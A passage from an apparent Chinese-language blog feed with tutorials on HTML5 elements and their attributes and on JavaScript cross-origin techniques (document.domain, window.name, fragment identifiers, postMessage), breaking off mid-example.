    &lt;h1&gt;Welcome to my homepage&lt;/h1&gt;
    &lt;p&gt;My name is Donald Duck&lt;/p&gt;
&lt;/header&gt;

&lt;p&gt;The rest of my home page...&lt;/p&gt;
</code></pre><h5 id="定义和用法-2"><a href="#定义和用法-2" class="headerlink" title="定义和用法"></a>定义和用法</h5><p><code>&lt;header&gt;</code>定义 section 或 page 的页眉（介绍信息）。</p>
<h3 id="footer标签"><a href="#footer标签" class="headerlink" title="footer标签"></a>footer标签</h3><pre><code>&lt;footer&gt;
      &lt;p&gt;Posted by: Ajun&lt;/p&gt;
      &lt;p&gt;Contact information: &lt;a href=&quot;mailto:774271383@qq.com&quot;&gt;774271383@qq.com&lt;/a&gt;.&lt;/p&gt;
&lt;/footer&gt;
</code></pre><h5 id="定义和用法-3"><a href="#定义和用法-3" class="headerlink" title="定义和用法"></a>定义和用法</h5><p><code>&lt;footer&gt;</code> 标签定义文档或节的页脚。</p>
<p>页脚通常包含文档的作者、版权信息、使用条款链接、联系信息等等。<br>一个文档中可以使用多个 <code>&lt;footer&gt;</code> 元素。</p>
<blockquote>
<p><code>&lt;footer&gt;</code> 元素内的联系信息应该位于 <code>&lt;address&gt;</code> 标签中。</p>
</blockquote>
<h3 id="output标签"><a href="#output标签" class="headerlink" title="output标签"></a>output标签</h3><pre><code>&lt;form oninput=&quot;x.value=parseInt(a.value)+parseInt(b.value)&quot;&gt;0
       &lt;input type=&quot;range&quot; id=&quot;a&quot; value=&quot;50&quot;&gt;100+&lt;input type=&quot;number&quot; id=&quot;b&quot; value=&quot;50&quot;&gt;
       =&lt;output name=&quot;x&quot; for=&quot;a b&quot;&gt;100&lt;/output&gt;
&lt;/form&gt; 
</code></pre><h5 id="定义和用法-4"><a href="#定义和用法-4" class="headerlink" title="定义和用法"></a>定义和用法</h5><p><code>&lt;output&gt;</code>定义不同类型的输出，比如脚本的输出。</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>值</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>for</td>
<td>element_id</td>
<td>定义输出域相关的一个或多个元素。</td>
</tr>
<tr>
<td>form</td>
<td>form_id</td>
<td>定义输入字段所属的一个或多个表单。</td>
</tr>
<tr>
<td>name</td>
<td>name</td>
<td>定义对象的唯一名称。（表单提交时使用）</td>
</tr>
</tbody>
</table>
<h3 id="progress标签"><a href="#progress标签" class="headerlink" title="progress标签"></a>progress标签</h3><pre><code>&lt;progress value=&quot;22&quot; max=&quot;100&quot;&gt;&lt;/progress&gt; 
</code></pre><h5 id="浏览器支持-1"><a href="#浏览器支持-1" class="headerlink" title="浏览器支持"></a>浏览器支持</h5><p>Internet Explorer 9 以及更早的版本不支持 <code>&lt;progress&gt;</code> 标签。</p>
<h5 id="定义和用法-5"><a href="#定义和用法-5" class="headerlink" title="定义和用法"></a>定义和用法</h5><p><code>&lt;progress&gt;</code> 标签标示任务的进度（进程）。</p>
<blockquote>
<p>结合<code>&lt;progress&gt;</code>标签与 JavaScript 一同使用，来显示任务的进度。<br>注意不适合用来表示度量衡（例如，磁盘空间使用情况或查询结果）。如需表示度量衡，请使用 <code>&lt;meter&gt;</code> 标签代替。</p>
</blockquote>
<h3 id="article标签"><a href="#article标签" class="headerlink" title="article标签"></a>article标签</h3><pre><code>&lt;article&gt;
      &lt;h1&gt;Internet Explorer 9&lt;/h1&gt;
      &lt;p&gt;Windows Internet Explorer 9（简称 IE9）于2011年3月14日发布。&lt;/p&gt;
&lt;/article&gt;
</code></pre><h5 id="定义和用法-6"><a href="#定义和用法-6" class="headerlink" title="定义和用法"></a>定义和用法</h5><p><code>&lt;article&gt;</code> 标签规定独立的自包含内容。一篇文章应有其自身的意义，应该有可能独立于站点的其余部分对其进行分发。</p>
<p><code>&lt;article&gt;</code> 元素的潜在来源：</p>
<ul>
<li>论坛帖子</li>
<li>报纸文章</li>
<li>博客条目</li>
<li>用户评论</li>
</ul>
<h3 id="aside标签"><a href="#aside标签" class="headerlink" title="aside标签"></a>aside标签</h3><pre><code>&lt;p&gt;Me and my family visited The Epcot center this summer.&lt;/p&gt;
&lt;aside&gt;
    &lt;h4&gt;Epcot Center&lt;/h4&gt;
    The Epcot Center is a theme park in Disney World, Florida.
&lt;/aside&gt;
</code></pre><h5 id="定义和用法-7"><a href="#定义和用法-7" class="headerlink" title="定义和用法"></a>定义和用法</h5><p><code>&lt;aside&gt;</code>标签定义其所处内容之外的内容。aside的内容应该与附近的内容相关。</p>
<h3 id="bdi标签"><a href="#bdi标签" class="headerlink" title="bdi标签"></a>bdi标签</h3><pre><code>&lt;ul&gt;
    &lt;li&gt;Username &lt;bdi&gt;Bill&lt;/bdi&gt;:80 points&lt;/li&gt;
    &lt;li&gt;Username &lt;bdi&gt;Steve&lt;/bdi&gt;: 78 points&lt;/li&gt;
&lt;/ul&gt;
</code></pre><h5 id="定义和用法-8"><a href="#定义和用法-8" class="headerlink" title="定义和用法"></a>定义和用法</h5><p>bdi 指的是 bidi 隔离。</p>
<p><code>&lt;bdi&gt;</code> 标签允许您设置一段文本，使其脱离其父元素的文本方向设置。在发布用户评论或其他您无法完全控制的内容时，该标签很有用。</p>
<h3 id="command标签"><a href="#command标签" class="headerlink" title="command标签"></a>command标签</h3><pre><code>&lt;menu&gt;
    &lt;command onclick=&quot;alert(&apos;Hello World&apos;)&quot;&gt;Click Me!&lt;/command&gt;
&lt;/menu&gt;
</code></pre><h5 id="浏览器支持-2"><a href="#浏览器支持-2" class="headerlink" title="浏览器支持"></a>浏览器支持</h5><p>目前只有 Internet Explorer 支持 <code>&lt;command&gt;</code> 标签。(自己测试怎么IE也不行)</p>
<h5 id="定义和用法-9"><a href="#定义和用法-9" class="headerlink" title="定义和用法"></a>定义和用法</h5><p>command 元素表示用户能够调用的命令。可以定义命令按钮，比如单选按钮、复选框或按钮。</p>
<p>只有当 command 元素位于 menu 元素内时，该元素才是可见的。否则不会显示这个元素，但是可以用它规定键盘快捷键。</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>值</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>checked</td>
<td>checked</td>
<td>定义是否被选中。仅用于 radio 或 checkbox 类型。</td>
</tr>
<tr>
<td>disabled</td>
<td>disabled</td>
<td>定义 command 是否可用。</td>
</tr>
<tr>
<td>icon</td>
<td>url</td>
<td>定义作为 command 来显示的图像的 url。</td>
</tr>
<tr>
<td>label</td>
<td>text</td>
<td>为 command 定义可见的 label。</td>
</tr>
<tr>
<td>radiogroup</td>
<td>groupname</td>
<td>定义 command 所属的组名。仅在类型为 radio 时使用。</td>
</tr>
<tr>
<td>type</td>
<td>checkbox<br>command<br>radio</td>
<td>定义该 command 的类型。默认是 “command”。</td>
</tr>
</tbody>
</table>
<h3 id="datalist标签"><a href="#datalist标签" class="headerlink" title="datalist标签"></a>datalist标签</h3><pre><code>&lt;input id=&quot;myCar&quot; list=&quot;cars&quot; /&gt;
&lt;datalist id=&quot;cars&quot;&gt;
  &lt;option value=&quot;BMW&quot;&gt;宝马&lt;/option&gt;
  &lt;option value=&quot;Ford&quot;&gt;福特&lt;/option&gt;
  &lt;option value=&quot;Volvo&quot;&gt;沃尔沃&lt;/option&gt;
&lt;/datalist&gt;
</code></pre><h5 id="定义和用法-10"><a href="#定义和用法-10" class="headerlink" title="定义和用法"></a>定义和用法</h5><p><code>&lt;datalist&gt;</code>标签定义下拉选项列表。请与 input 元素配合使用该元素，来定义 input 可能的值。</p>
<p>datalist 及其选项不会被显示出来，它仅仅是合法的输入值列表。</p>
<blockquote>
<ul>
<li>请使用 input 元素的 list 属性来绑定 datalist。<ul>
<li>注意value属性值为选项内容，option标签内为当前选项内容的注释。</li>
<li>区别与select标签的区分，输入方式也有所不同。</li>
</ul>
</li>
</ul>
</blockquote>
<h3 id="details标签"><a href="#details标签" class="headerlink" title="details标签"></a>details标签</h3><pre><code>&lt;details&gt;
    &lt;summary&gt;Copyright 2011.&lt;/summary&gt;
    &lt;p&gt;All pages and graphics on this web site are the property of W3School.&lt;/p&gt;
&lt;/details&gt;
</code></pre><blockquote>
<p>与<code>&lt;summary&gt;</code>标签配合使用可以为details定义标题。标题是可见的，用户点击标题时，会显示出 details。若不定义summary则标题显示详细信息。</p>
</blockquote>
<h5 id="定义和用法-11"><a href="#定义和用法-11" class="headerlink" title="定义和用法"></a>定义和用法</h5><p>定义元素的细节，用于描述文档或文档某个部分的细节。</p>
<h5 id="浏览器支持-3"><a href="#浏览器支持-3" class="headerlink" title="浏览器支持"></a>浏览器支持</h5><p>目前只有 Chrome 支持 <code>&lt;details&gt;</code> 标签。其他浏览器不识别但是会使用衬线体来直接显示其内所有内容。</p>
<h5 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h5><p>open属性，只有一个值“open”，定义 details 内的内容默认可见。</p>
<h3 id="dialog标签"><a href="#dialog标签" class="headerlink" title="dialog标签"></a>dialog标签</h3><pre><code>&lt;table border=&quot;1&quot;&gt;
&lt;tr&gt;
  &lt;th&gt;一月 &lt;dialog open&gt;这是打开的对话窗口&lt;/dialog&gt;&lt;/th&gt;
  &lt;th&gt;二月&lt;/th&gt;
  &lt;th&gt;三月&lt;/th&gt;
&lt;/tr&gt;
&lt;tr&gt;
  &lt;td&gt;31&lt;/td&gt;
  &lt;td&gt;28&lt;/td&gt;
  &lt;td&gt;31&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
</code></pre><h5 id="定义和用法-12"><a href="#定义和用法-12" class="headerlink" title="定义和用法"></a>定义和用法</h5><p>定义对话框或窗口。</p>
<h5 id="属性-1"><a href="#属性-1" class="headerlink" title="属性"></a>属性</h5><p>open属性，只有一个值“open”，规定 dialog 元素是活动的，用户可与之交互。</p>
<h5 id="浏览器支持-4"><a href="#浏览器支持-4" class="headerlink" title="浏览器支持"></a>浏览器支持</h5><p>目前只有 Chrome 和 Safari 6 支持 <dialog> 标签。</dialog></p>
<h3 id="embed标签"><a href="#embed标签" class="headerlink" title="embed标签"></a>embed标签</h3><pre><code>&lt;embed src=&quot;helloworld.swf&quot; /&gt;
</code></pre><h5 id="定义和用法-13"><a href="#定义和用法-13" class="headerlink" title="定义和用法"></a>定义和用法</h5><p>定义嵌入的内容，可以用来插入各种多媒体，格式可以是Swf、Midi、Wav、AIFF、AU、MP3等等。</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>值</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>height</td>
<td>pixels</td>
<td>设置嵌入内容的高度。</td>
</tr>
<tr>
<td>src</td>
<td>url</td>
<td>嵌入内容的 URL。</td>
</tr>
<tr>
<td>type</td>
<td>type</td>
<td>定义嵌入内容的类型。</td>
</tr>
<tr>
<td>width</td>
<td>pixels</td>
<td>设置嵌入内容的宽度。</td>
</tr>
</tbody>
</table>
<h3 id="figure标签"><a href="#figure标签" class="headerlink" title="figure标签"></a>figure标签</h3><pre><code>&lt;figure&gt;
  &lt;p&gt;黄浦江上的的卢浦大桥&lt;/p&gt;
  &lt;img src=&quot;shanghai_lupu_bridge.jpg&quot; width=&quot;350&quot; height=&quot;234&quot; /&gt;
&lt;/figure&gt;
</code></pre><h5 id="定义和用法-14"><a href="#定义和用法-14" class="headerlink" title="定义和用法"></a>定义和用法</h5><p><code>&lt;figure&gt;</code> 标签规定独立的流内容（图像、图表、照片、代码等等）,定义媒介内容的分组，以及它们的标题。其内容应该与主内容相关，但如果被删除，则不应对文档流产生影响。</p>
<blockquote>
<p>使用 <code>&lt;figcaption&gt;</code> 元素为 figure 添加标题（caption）。</p>
</blockquote>
<h3 id="input标签"><a href="#input标签" class="headerlink" title="input标签"></a>input标签</h3><p>H5新增许多其属性，列表如下</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>值</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>accept</td>
<td>mime_type</td>
<td>规定通过文件上传来提交的文件的类型。</td>
</tr>
<tr>
<td>align</td>
<td>left<br>right<br>top<br>middle<br>bottom</td>
<td>不赞成使用。规定图像输入的对齐方式。</td>
</tr>
<tr>
<td>alt</td>
<td>text</td>
<td>定义图像输入的替代文本。</td>
</tr>
<tr>
<td>autocomplete</td>
<td>on<br>off</td>
<td>规定是否使用输入字段的自动完成功能。</td>
</tr>
<tr>
<td>autofocus</td>
<td>autofocus</td>
<td>规定输入字段在页面加载时是否获得焦点。（不适用于 type=”hidden”）</td>
</tr>
<tr>
<td>checked</td>
<td>checked</td>
<td>规定此 input 元素首次加载时应当被选中。</td>
</tr>
<tr>
<td>disabled</td>
<td>disabled</td>
<td>当 input 元素加载时禁用此元素。</td>
</tr>
<tr>
<td>form</td>
<td>formname</td>
<td>规定输入字段所属的一个或多个表单。</td>
</tr>
<tr>
<td>formaction</td>
<td>URL</td>
<td>覆盖表单的 action 属性。（适用于 type=”submit” 和 type=”image”）</td>
</tr>
<tr>
<td>formenctype</td>
<td>见注释</td>
<td>覆盖表单的 enctype 属性。（适用于 type=”submit” 和 type=”image”）</td>
</tr>
<tr>
<td>formmethod</td>
<td>get<br>post</td>
<td>覆盖表单的 method 属性。（适用于 type=”submit” 和 type=”image”）</td>
</tr>
<tr>
<td>formnovalidate</td>
<td>formnovalidate</td>
<td>覆盖表单的 novalidate 属性。如果使用该属性，则提交表单时不进行验证。</td>
</tr>
<tr>
<td>formtarget</td>
<td>_blank<br>_self<br>_parent<br>_top<br>framename</td>
<td>覆盖表单的 target 属性。（适用于 type=”submit” 和 type=”image”）</td>
</tr>
<tr>
<td>height</td>
<td>pixels<br>%</td>
<td>定义 input 字段的高度。（适用于 type=”image”）</td>
</tr>
<tr>
<td>list</td>
<td>datalist-id</td>
<td>引用包含输入字段的预定义选项的 datalist 。</td>
</tr>
<tr>
<td>max</td>
<td>number<br>date</td>
<td>规定输入字段的最大值。请与 “min” 属性配合使用，来创建合法值的范围。</td>
</tr>
<tr>
<td>maxlength</td>
<td>number</td>
<td>规定输入字段中的字符的最大长度。</td>
</tr>
<tr>
<td>min</td>
<td>number<br>date</td>
<td>规定输入字段的最小值。请与 “max” 属性配合使用，来创建合法值的范围。</td>
</tr>
<tr>
<td>multiple</td>
<td>multiple</td>
<td>如果使用该属性，则允许一个以上的值。</td>
</tr>
<tr>
<td>name</td>
<td>field_name</td>
<td>定义 input 元素的名称。</td>
</tr>
<tr>
<td>pattern</td>
<td>regexp_pattern</td>
<td>规定输入字段的值的模式或格式。例如 pattern=”[0-9]” 表示输入值必须是 0 与 9 之间的数字。</td>
</tr>
<tr>
<td>placeholder</td>
<td>text</td>
<td>规定帮助用户填写输入字段的提示。</td>
</tr>
<tr>
<td>readonly</td>
<td>readonly</td>
<td>规定输入字段为只读。</td>
</tr>
<tr>
<td>required</td>
<td>required</td>
<td>指示输入字段的值是必需的。</td>
</tr>
<tr>
<td>size</td>
<td>number_of_char</td>
<td>定义输入字段的宽度。</td>
</tr>
<tr>
<td>src</td>
<td>URL</td>
<td>定义以提交按钮形式显示的图像的 URL。</td>
</tr>
<tr>
<td>step</td>
<td>number</td>
<td>规定输入字的的合法数字间隔。</td>
</tr>
<tr>
<td>type</td>
<td>button<br>checkbox<br>file<br>hidden<br>image<br>password<br>radio<br>reset<br>submit<br>text</td>
<td>规定 input 元素的类型。</td>
</tr>
<tr>
<td>value</td>
<td>value</td>
<td>规定 input 元素的值。</td>
</tr>
<tr>
<td>width</td>
<td>pixels<br>%</td>
<td>定义 input 字段的宽度。（适用于 type=”image”）</td>
</tr>
</tbody>
</table>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;目录&quot;&gt;&lt;a href=&quot;#目录&quot; class=&quot;headerlink&quot; title=&quot;目录&quot;&gt;&lt;/a&gt;目录&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;用于绘画的 canvas 元素&lt;/li&gt;
&lt;li&gt;用于媒介回放的 video 和 audio 元素&lt;/li&gt;
&lt;li&gt;对本地离线存储的更好的支持&lt;/li&gt;
&lt;li&gt;新的特殊内容元素，比如 article、footer、header、nav、section&lt;/li&gt;
&lt;li&gt;新的表单控件，比如 calendar、date、time、email、url、search&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="html" scheme="https://jasonyan2015.github.io/tags/html/"/>
    
  </entry>
  
  <entry>
    <title>js跨域问题</title>
    <link href="https://jasonyan2015.github.io/2017/04/04/js%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98/"/>
    <id>https://jasonyan2015.github.io/2017/04/04/js跨域问题/</id>
    <published>2017-04-04T02:15:55.878Z</published>
    <updated>2017-04-08T16:24:03.408Z</updated>
    
    <content type="html"><![CDATA[<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><h3 id="同源包括三个相同"><a href="#同源包括三个相同" class="headerlink" title="同源包括三个相同"></a>同源包括三个相同</h3><ul>
<li>协议（protocol）相同</li>
<li>域名（domain/host）相同</li>
<li>端口（port）相同</li>
</ul>
<a id="more"></a>
<p>举例来说，对于<code>http://www.example.com/dir/page.html</code>这个网址，协议是<code>http://</code>，域名是<code>www.example.com</code>，端口是<code>80</code>（默认端口可以省略）。它的同源情况如下。</p>
<ul>
<li><a href="http://www.example.com/dir2/other.html：同源" target="_blank" rel="external">http://www.example.com/dir2/other.html：同源</a></li>
<li><a href="http://example.com/dir/other.html：不同源（域名不同）" target="_blank" rel="external">http://example.com/dir/other.html：不同源（域名不同）</a></li>
<li><a href="http://v2.www.example.com/dir/other.html：不同源（域名不同）" target="_blank" rel="external">http://v2.www.example.com/dir/other.html：不同源（域名不同）</a></li>
<li><a href="http://www.example.com:81/dir/other.html：不同源（端口不同）" target="_blank" rel="external">http://www.example.com:81/dir/other.html：不同源（端口不同）</a></li>
</ul>
<p>更多例子：</p>
<table>
<thead>
<tr>
<th>URL</th>
<th>说明</th>
<th>是否允许通信</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="http://www.a.com/a.js" target="_blank" rel="external">http://www.a.com/a.js</a><br><a href="http://www.a.com/b.js" target="_blank" rel="external">http://www.a.com/b.js</a></td>
<td>同一域名下</td>
<td>允许</td>
</tr>
<tr>
<td><a href="http://www.a.com/lab/a.js" target="_blank" rel="external">http://www.a.com/lab/a.js</a><br><a href="http://www.a.com/script/b.js" target="_blank" rel="external">http://www.a.com/script/b.js</a></td>
<td>同一域名下不同文件夹</td>
<td>允许</td>
</tr>
<tr>
<td><a href="http://www.a.com:8000/a.js" target="_blank" rel="external">http://www.a.com:8000/a.js</a><br><a href="http://www.a.com/b.js" target="_blank" rel="external">http://www.a.com/b.js</a></td>
<td>同一域名，不同端口</td>
<td>不允许</td>
</tr>
<tr>
<td><a href="http://www.a.com/a.js" target="_blank" rel="external">http://www.a.com/a.js</a><br><a href="https://www.a.com/b.js" target="_blank" rel="external">https://www.a.com/b.js</a></td>
<td>同一域名，不同协议</td>
<td>不允许</td>
</tr>
<tr>
<td><a href="http://www.a.com/a.js" target="_blank" rel="external">http://www.a.com/a.js</a><br><a href="http://70.32.92.74/b.js" target="_blank" rel="external">http://70.32.92.74/b.js</a></td>
<td>域名和域名对应ip</td>
<td>不允许</td>
</tr>
<tr>
<td><a href="http://www.a.com/a.js" target="_blank" rel="external">http://www.a.com/a.js</a><br><a href="http://script.a.com/b.js" target="_blank" rel="external">http://script.a.com/b.js</a></td>
<td>主域相同，子域不同</td>
<td>不允许</td>
</tr>
<tr>
<td><a href="http://www.a.com/a.js" target="_blank" rel="external">http://www.a.com/a.js</a><br><a href="http://a.com/b.js" target="_blank" rel="external">http://a.com/b.js</a></td>
<td>同一域名，不同二级域名（同上）</td>
<td>不允许（cookie这种情况下也不允许访问）</td>
</tr>
<tr>
<td><a href="http://www.cnblogs.com/a.js" target="_blank" rel="external">http://www.cnblogs.com/a.js</a><br><a href="http://a.com/b.js" target="_blank" rel="external">http://a.com/b.js</a></td>
<td>不同域名</td>
<td>不允许</td>
</tr>
</tbody>
</table>
<blockquote>
<p>注意</p>
<ol>
<li>如果是协议和端口造成的跨域问题“前台”是无能为力的，</li>
<li>在跨域问题上，域仅仅是通过“URL的首部”来识别而不会去尝试判断相同的ip地址对应着两个域或两个域是否在同一个ip上。</li>
</ol>
<blockquote>
<p>“URL的首部”指<code>window.location.protocol</code> + <code>window.location.host</code>，也可以理解为“Domains, protocols and ports must match”。</p>
</blockquote>
</blockquote>
<h3 id="同源策略的目的"><a href="#同源策略的目的" class="headerlink" title="同源策略的目的"></a>同源策略的目的</h3><p>为了保证用户信息的安全，防止恶意的网站窃取数据。</p>
<h3 id="受限制的行为"><a href="#受限制的行为" class="headerlink" title="受限制的行为"></a>受限制的行为</h3><ul>
<li>Cookie、LocalStorage 和 IndexDB 无法读取。</li>
<li>DOM 无法获得。</li>
<li>AJAX 请求不能发送。</li>
</ul>
<h2 id="cookie跨域"><a href="#cookie跨域" class="headerlink" title="cookie跨域"></a>cookie跨域</h2><p>Cookie 是服务器写入浏览器的一小段信息，是储存在用户本地终端上的数据，通常被用来记录访问者的一些信息（尽管这并不安全），只有同源的网页才能共享。</p>
<p>不过这个共享范围比同源稍宽松些。</p>
<h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><p>如果两个网页一级域名相同，只是二级域名不同，那么浏览器允许通过设置document.domain来共享 Cookie。</p>
<p>例如：</p>
<ol>
<li>对A,B网页同时设置：<code>document.domain = &#39;example.com&#39;;</code></li>
<li>在A网页中通过脚本设置一个Cookie：<code>document.cookie = &quot;test1=hello&quot;;</code></li>
<li>B网页就可以读到这个 Cookie：<code>var allCookie = document.cookie;</code></li>
</ol>
<blockquote>
<p>注意：这种方法只适用于 Cookie 和 iframe 窗口（下一节会谈到），LocalStorage 和 IndexDB 无法通过这种方法规避同源政策，而要使用下文介绍的PostMessage API。</p>
<p>另外，服务器也可以在设置Cookie的时候，指定Cookie的所属域名为一级域名，比如为<code>.example.com</code>设置<code>Set-Cookie: key=value; domain=.example.com; path=/</code>这样的话，二级域名和三级域名不用做任何设置，都可以读取这个Cookie。</p>
</blockquote>
<h2 id="iframe跨域"><a href="#iframe跨域" class="headerlink" title="iframe跨域"></a>iframe跨域</h2><p>如果两个网页不同源，就无法拿到对方的DOM。<br>典型的例子是<code>iframe</code>窗口和<code>window.open</code>方法打开的窗口，它们与父窗口无法通信。</p>
<p>比如，父窗口运行下面的命令，如果<code>iframe</code>窗口不是同源，就会报错。</p>
<pre><code>document.getElementById(&quot;myIFrame&quot;).contentWindow.document
// Uncaught DOMException: Blocked a frame from accessing a cross-origin frame.
</code></pre><p>上面命令中，父窗口想获取子窗口的DOM，因为跨源导致报错。<br>反之亦然，子窗口获取主窗口的DOM也会报错。</p>
<pre><code>window.parent.document.body
// 报错
</code></pre><h3 id="解决办法-1"><a href="#解决办法-1" class="headerlink" title="解决办法"></a>解决办法</h3><h4 id="如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的document-domain属性，就可以规避同源策略来访问DOM。"><a href="#如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的document-domain属性，就可以规避同源策略来访问DOM。" class="headerlink" title="如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的document.domain属性，就可以规避同源策略来访问DOM。"></a>如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的<code>document.domain</code>属性，就可以规避同源策略来访问DOM。</h4><p>举例如下</p>
<p>在a.html中</p>
<pre><code>document.domain = &apos;a.com&apos;;
var ifr = document.createElement(&apos;iframe&apos;);
ifr.src = &apos;http://script.a.com/b.html&apos;;
ifr.style.display = &apos;none&apos;;
document.body.appendChild(ifr);
ifr.onload = function(){
    var doc = ifr.contentDocument || ifr.contentWindow.document;
    // 在这里操纵b.html
    alert(doc.getElementsByTagName(&quot;h1&quot;)[0].childNodes[0].nodeValue);
};
</code></pre><p>b.html中</p>
<pre><code>document.domain = &apos;a.com&apos;;
</code></pre><h4 id="对于完全不同源的网站，目前有以下几种方法可以解决跨域窗口的通信问题"><a href="#对于完全不同源的网站，目前有以下几种方法可以解决跨域窗口的通信问题" class="headerlink" title="对于完全不同源的网站，目前有以下几种方法可以解决跨域窗口的通信问题"></a>对于完全不同源的网站，目前有以下几种方法可以解决跨域窗口的通信问题</h4><ol>
<li>片段识别符（fragment identifier）</li>
<li>设置<code>window.name</code></li>
<li>跨文档通信API（Cross-document messaging）</li>
</ol>
<h5 id="片段标识符"><a href="#片段标识符" class="headerlink" title="片段标识符"></a>片段标识符</h5><p>片段标识符（fragment identifier）指的是，URL的#号后面的部分，比如<code>http://example.com/x.html#fragment的#fragment</code>。如果只是改变片段标识符，页面不会重新刷新。</p>
<p>父窗口可以把信息，写入子窗口的片段标识符。</p>
<pre><code>var src = originURL + &apos;#&apos; + data;
document.getElementById(&apos;myIFrame&apos;).src = src;
</code></pre><p>子窗口通过监听<code>hashchange</code>事件得到通知。</p>
<pre><code>window.onhashchange = checkMessage;

function checkMessage() {
  var message = window.location.hash;
  // ...
}
</code></pre><p>同样的，子窗口也可以改变父窗口的片段标识符。</p>
<pre><code>parent.location.href= target + &quot;#&quot; + hash;
</code></pre><h5 id="设置window-name"><a href="#设置window-name" class="headerlink" title="设置window.name"></a>设置<code>window.name</code></h5><p>浏览器窗口有<code>window.name</code>属性。这个属性的最大特点是，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页可以读取它。</p>
<p>有三个页面：</p>
<ul>
<li>a.com/app.html：应用页面。</li>
<li>a.com/proxy.html：代理文件，一般是一个没有任何内容的html文件，需要和应用页面在同一域下。</li>
<li>b.com/data.html：应用页面需要获取数据的页面，可称为数据页面。</li>
</ul>
<p>过程如下：</p>
<ol>
<li>在应用页面<code>（a.com/app.html）</code>中创建一个<code>iframe</code>，把其<code>src</code>指向数据页面<code>（b.com/data.html）</code>。数据页面<code>（b.com/data.html）</code>设置window.name时，由于同源，会自动把数据附加到这个<code>iframe</code>的<code>window.name</code>上，代码如下：<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
        window.name = &apos;I was there!&apos;;    //这里是要传输的数据，大小一般为2M，IE和firefox下可以大至32M左右。
                                         //数据格式可以自定义，如json、字符串
&lt;/script&gt;
</code></pre></li>
<li>在应用页面<code>（a.com/app.html）</code>中监听<code>iframe</code>的<code>onload</code>事件，在此事件中设置这个<code>iframe</code>的<code>src</code>指向本地域的代理文件（代理文件和应用页面在同一域下，所以可以相互通信）。app.html部分代码如下：<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
    var state = 0, 
    iframe = document.createElement(&apos;iframe&apos;),
    loadfn = function() {
        if (state === 1) {
            var data = iframe.contentWindow.name;    // 读取数据
            alert(data);    //弹出&apos;I was there!&apos;
        } else if (state === 0) {
            state = 1;
            iframe.contentWindow.location = &quot;http://a.com/proxy.html&quot;;    // 设置的代理文件，此时由于iframe的loaction改变，又一次触发load事件
        }  
    };
    iframe.src = &apos;http://b.com/data.html&apos;;
    if (iframe.attachEvent) {
        iframe.attachEvent(&apos;onload&apos;, loadfn);
    } else {
        iframe.onload  = loadfn;
    }
    document.body.appendChild(iframe);
&lt;/script&gt;
</code></pre></li>
<li>获取数据以后销毁这个<code>iframe</code>，释放内存；这也保证了安全（不被其他域frame js访问）。<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
    iframe.contentWindow.document.write(&apos;&apos;);
    iframe.contentWindow.close();
    document.body.removeChild(iframe);
&lt;/script&gt;
</code></pre></li>
</ol>
<p>总结起来即：iframe的src属性由外域转向本地域，跨域数据即由iframe的window.name从外域传递到本地域。这个就巧妙地绕过了浏览器的跨域访问限制，但同时它又是安全操作。</p>
<ul>
<li>优点: window.name容量很大，可以放置非常长的字符串；</li>
<li>缺点: 必须监听子窗口window.name属性的变化，影响网页性能。</li>
</ul>
<h5 id="跨文档通信API–postMessage"><a href="#跨文档通信API–postMessage" class="headerlink" title="跨文档通信API–postMessage()"></a>跨文档通信API–postMessage()</h5><p>HTML5新增一个<code>window.postMessage</code>方法，允许跨窗口通信，不论这两个窗口是否同源。并且支持基于web的实时消息传递。</p>
<pre><code>otherWindow.postMessage(message, targetOrigin);
</code></pre><ul>
<li><code>otherWindow</code>: 对接收信息页面的window的引用。可以是页面中<code>iframe</code>的<code>contentWindow</code>属性；<code>window.open</code>的返回值；通过<code>name</code>或下标从<code>window.frames</code>取到的值。</li>
<li><code>message</code>: 所要发送的数据，string类型。</li>
<li><code>targetOrigin</code>: 用于限制otherWindow，即”协议 + 域名 + 端口”，<code>*</code>表示不限制域名，向所有窗口发送</li>
</ul>
<p>举例来说，父窗口<code>http://aaa.com</code>与子窗口<code>http://bbb.com</code>互发消息</p>
<p>父-&gt;子</p>
<pre><code>var popup = window.open(&apos;http://bbb.com&apos;, &apos;title&apos;);
popup.postMessage(&apos;Hello World!&apos;, &apos;http://bbb.com&apos;);
</code></pre><p>子-&gt;父</p>
<pre><code>window.opener.postMessage(&apos;Nice to see you&apos;, &apos;http://aaa.com&apos;);
</code></pre><p>接受消息：message事件</p>
<pre><code>window.addEventListener(&apos;message&apos;, function(e) {
  console.log(e.data);
},false);
</code></pre><p><code>message</code>事件的事件对象<code>event</code>，提供以下三个属性。</p>
<ul>
<li>event.source：发送消息的窗口</li>
<li>event.origin: 消息发向的网址</li>
<li>event.data: 消息内容</li>
</ul>
<p>下面的例子是，子窗口通过<code>event.source</code>属性引用父窗口，然后发送消息。</p>
<pre><code>window.addEventListener(&apos;message&apos;, receiveMessage);
function receiveMessage(event) {
  event.source.postMessage(&apos;Nice to see you!&apos;, &apos;*&apos;);
}
</code></pre><p><code>event.origin</code>属性可以过滤不是发给本窗口的消息。</p>
<pre><code>window.addEventListener(&apos;message&apos;, receiveMessage);
function receiveMessage(event) {
